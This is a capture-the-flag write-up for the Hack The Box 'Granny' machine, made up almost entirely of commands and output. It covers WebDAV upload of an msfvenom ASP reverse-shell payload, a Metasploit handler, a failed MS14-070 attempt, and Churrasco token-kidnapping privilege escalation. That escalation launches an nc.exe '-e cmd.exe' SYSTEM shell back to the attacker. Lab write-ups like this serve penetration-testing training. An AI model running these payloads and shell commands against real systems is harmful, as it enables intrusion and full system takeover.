# granny: https://app.hackthebox.com/machines/Granny

```bash
nmap -sC -sV 10.10.10.15  
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-18 15:55 EDT
Nmap scan report for 10.10.10.15
Host is up (0.084s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
|_http-server-header: Microsoft-IIS/6.0
|_http-title: Under Construction
| http-webdav-scan: 
|   Server Type: Microsoft-IIS/6.0
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
|   WebDAV type: Unknown
|_  Server Date: Tue, 18 Apr 2023 19:55:49 GMT
| http-methods: 
|_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

```bash
echo "MUCK" > reverse.txt

cadaver http://10.10.10.15
dav:/> ls
Listing collection `/': succeeded.
Coll:   _private                               0  Apr 12  2017
Coll:   _vti_bin                               0  Apr 12  2017
Coll:   _vti_cnf                               0  Apr 12  2017
Coll:   _vti_log                               0  Apr 12  2017
Coll:   _vti_pvt                               0  Apr 12  2017
Coll:   _vti_script                            0  Apr 12  2017
Coll:   _vti_txt                               0  Apr 12  2017
Coll:   aspnet_client                          0  Apr 12  2017
Coll:   images                                 0  Apr 12  2017
        _vti_inf.html                       1754  Apr 12  2017
        iisstart.htm                        1433  Feb 21  2003
        pagerror.gif                        2806  Feb 21  2003
        postinfo.html                       2440  Apr 12  2017
dav:/> put reverse.txt 
Uploading reverse.txt to `/reverse.txt':
Progress: [=============================>] 100.0% of 5 bytes succeeded.

```
```bash
curl http://10.10.10.15/reverse.txt
MUCK
```

```bash
msfvenom -p windows/shell/reverse_tcp LHOST=10.10.14.38 LPORT=9999 -f asp > shell.asp

msfvenom -p windows/shell/reverse_tcp LHOST=10.10.14.38 LPORT=9999 -f asp > shell.asp
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of asp file: 38391 bytes

mv shell.asp shell.asp.txt

msf6 > use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.10.14.38
LHOST => 10.10.14.38
msf6 exploit(multi/handler) > set LPORT 9999
LPORT => 9999
msf6 exploit(multi/handler) > set payload windows/shell/reverse_tcp

payload => windows/shell/reverse_tcp

show options 

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------

Payload options (windows/shell/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.14.38      yes       The listen address (an interface may be specified)
   LPORT     9999             yes       The listen port

msf6 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 10.10.14.38:9999 
```

```bash
dav:/> put shell.asp.txt 
Uploading shell.asp.txt to `/shell.asp.txt':
Progress: [=============================>] 100.0% of 38391 bytes succeeded.

dav:/> mv shell.asp.txt shell.asp
Moving `/shell.asp.txt' to `/shell.asp':  succeeded.
```

```bash
msf6 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 10.10.14.38:9999 
[*] Sending stage (240 bytes) to 10.10.10.15
[*] Command shell session 1 opened (10.10.14.38:9999 -> 10.10.10.15:1030) at 2023-04-18 16:17:34 -0400

Shell Banner:
Microsoft Windows [Version 5.2.3790]
-----
          
c:\windows\system32\inetsrv>whoami
whoami
nt authority\network service
```

```bash
wget https://raw.githubusercontent.com/AonCyberLabs/Windows-Exploit-Suggester/master/windows-exploit-suggester.py

python2 windows-exploit-suggester.py --update    
[*] initiating winsploit version 3.3...
[+] writing to file 2023-04-18-mssb.xls
[*] done
```
```bash
cat systeminfo.txt    

Host Name:                 GRANNY
OS Name:                   Microsoft(R) Windows(R) Server 2003, Standard Edition
OS Version:                5.2.3790 Service Pack 2 Build 3790
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Uniprocessor Free
Registered Owner:          HTB
Registered Organization:   HTB
Product ID:                69712-296-0024942-44782
Original Install Date:     4/12/2017, 5:07:40 PM
System Up Time:            0 Days, 0 Hours, 55 Minutes, 52 Seconds
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               X86-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: x86 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
BIOS Version:              INTEL  - 6040000
Windows Directory:         C:\WINDOWS
System Directory:          C:\WINDOWS\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (GMT+02:00) Athens, Beirut, Istanbul, Minsk
Total Physical Memory:     1,023 MB
Available Physical Memory: 729 MB
Page File: Max Size:       2,470 MB
Page File: Available:      2,272 MB
Page File: In Use:         198 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 1 Hotfix(s) Installed.
                           [01]: Q147222
Network Card(s):           N/A
```

```bash
 python2 windows-exploit-suggester.py --database 2023-04-18-mssb.xls --systeminfo systeminfo.txt

.
.snipped
.
E] MS14-070: Vulnerability in TCP/IP Could Allow Elevation of Privilege (2989935) - Important
[*]   http://www.exploit-db.com/exploits/35936/ -- Microsoft Windows Server 2003 SP2 - Privilege Escalation, PoC
[*] 
.
.snipped
.

dav:/> put MS14-070/MS14-070/MS14-070.exe.txt 
Uploading MS14-070/MS14-070/MS14-070.exe.txt to `/MS14-070.exe.txt':
Progress: [=============================>] 100.0% of 33812 bytes succeeded.
dav:/> mv MS14-070.exe.txt MS14-070.exe
Moving `/MS14-070.exe.txt' to `/MS14-070.exe':  succeeded.

C:\Inetpub\wwwroot>MS14-070.exe
MS14-070.exe
[*] MS14-070 (CVE-2014-4076) x86
    [*] by Tomislav Paskalev
[+] Created a new cmd.exe process
    [*] PID [dec]    :       3732
    [*] PID [hex]    : 0x00000e94
    [*] PID [hex LE] : 0x940e0000
[+] Modified shellcode
[+] Opened TCP/IP I/O device
[*] ntdll.dll address: 0x7C826C8F
[+] Allocated memory
    [*] BaseAddress  : 0x00000000
    [*] RegionSize   : 0x00005000
[*] Writing exploit...
    [+] done
[*] Spawning SYSTEM shell...
    [*] Parent proc hangs on exit

#DID NOT WORK OUT.
```

```bash
searchsploit Microsoft Server 2003
.
.snipped
.
Microsoft Windows Server 2003 - Token Kidnapping Local Privilege Escalation     | windows/local/6705.txt
.
.snipped
.
.
```

```bash
wget https://github.com/Re4son/Churrasco/blob/master/churrasco.exe
mv churrasco.exe churrasco.exe.txt

dav:/> put churrasco.exe.txt 
Uploading churrasco.exe.txt to `/churrasco.exe.txt':
Progress: [=============================>] 100.0% of 140162 bytes succeeded.
dav:/> mv churrasco.exe.txt churrasco.exe
Moving `/churrasco.exe.txt' to `/churrasco.exe':  succeeded.
```

```bash
C:\Inetpub\wwwroot>.\churrasco.exe "whoami"
.\churrasco.exe "whoami"
nt authority\system
```

```bash
dav:/> put nc.exe.txt 
Uploading nc.exe.txt to `/nc.exe.txt':
Progress: [=============================>] 100.0% of 38616 bytes succeeded.
dav:/> mv nc.exe.txt nc.exe
Moving `/nc.exe.txt' to `/nc.exe':  succeeded.
```

```bash
C:\Inetpub\wwwroot>.\churrasco.exe -d "C:\\inetpub\\wwwroot\\nc.exe 10.10.14.38 9996 -e cmd.exe"
.\churrasco.exe -d "C:\\inetpub\\wwwroot\\nc.exe 10.10.14.38 9996 -e cmd.exe"
/churrasco/-->Current User: NETWORK SERVICE 
/churrasco/-->Getting Rpcss PID ...
/churrasco/-->Found Rpcss PID: 668 
/churrasco/-->Searching for Rpcss threads ...
/churrasco/-->Found Thread: 672 
/churrasco/-->Thread not impersonating, looking for another thread...
/churrasco/-->Found Thread: 676 
/churrasco/-->Thread not impersonating, looking for another thread...
/churrasco/-->Found Thread: 684 
/churrasco/-->Thread impersonating, got NETWORK SERVICE Token: 0x730
/churrasco/-->Getting SYSTEM token from Rpcss Service...
/churrasco/-->Found NETWORK SERVICE Token
/churrasco/-->Found LOCAL SERVICE Token
/churrasco/-->Found SYSTEM token 0x728
/churrasco/-->Running command with SYSTEM Token...
/churrasco/-->Done, command should have ran as SYSTEM!
```

```bash
nc -lvnp 9996                                   
listening on [any] 9996 ...
connect to [10.10.14.38] from (UNKNOWN) [10.10.10.15] 1031
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

C:\WINDOWS\TEMP>whoami
whoami
nt authority\system
```

```bash
C:\Documents and Settings>type Lakis\Desktop\user.txt
type Lakis\Desktop\user.txt
700c5dc163014e22b3e408f8703f67d1
C:\Documents and Settings>type Administrator\Desktop\root.txt
type Administrator\Desktop\root.txt
aa4beed1c0584445ab463a6747bd06e9
```

***References*** <br>
<https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/put-method-webdav><br>
<https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/msfvenom><br>
<https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-070><br>

